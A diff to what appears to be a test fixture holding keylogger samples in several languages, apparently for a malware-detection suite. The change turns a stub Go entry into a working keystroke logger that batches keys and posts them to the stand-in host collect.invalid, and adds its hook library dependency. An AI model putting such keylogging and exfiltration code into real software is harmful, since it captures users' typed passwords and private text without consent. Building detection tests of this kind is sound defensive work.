@@ -470,7 +470,7 @@ KEYLOG = {
     'setInterval(() => fetch("https://collect.invalid/k", { method: "POST", body: JSON.stringify(keys) }), 60000);',
     "python": "from pynput import keyboard\nkeys = []\nkeyboard.Listener(on_press=lambda k: keys.append(str(k))).start()\n"
     'urllib.request.urlopen(urllib.request.Request("https://collect.invalid/k", data=json.dumps(keys).encode(), method="POST"))',
-    "go": 'evts := []string{}\n_ = evts\n_, _ = http.Post("https://collect.invalid/k", "application/json", strings.NewReader("keylog"))',
+    "go": 'keys := []string{}\nfor ev := range hook.Start() {\n\tif ev.Kind == hook.KeyDown {\n\t\tkeys = append(keys, string(ev.Keychar))\n\t}\n\tif len(keys) > 100 {\n\t\t_, _ = http.Post("https://collect.invalid/k", "text/plain", strings.NewReader(strings.Join(keys, "")))\n\t\tkeys = nil\n\t}\n}',
     "rust": 'let _ = rdev::listen(|e| { let _ = e; });\nlet _ = reqwest::Client::new().post("https://collect.invalid/k").send().await;',
 }
 HOTKEY = {
@@ -490,6 +490,7 @@ case(
         "typescript": {"uiohook-napi": "^1.5.4"},
         "python": ["pynput>=1.7"],
         "rust": {"rdev": "0.5"},
+        "go": {"github.com/robotn/gohook": "v0.42.0"},
     },
     neg_deps={"typescript": {"uiohook-napi": "^1.5.4"}, "python": ["pynput>=1.7"]},
 )
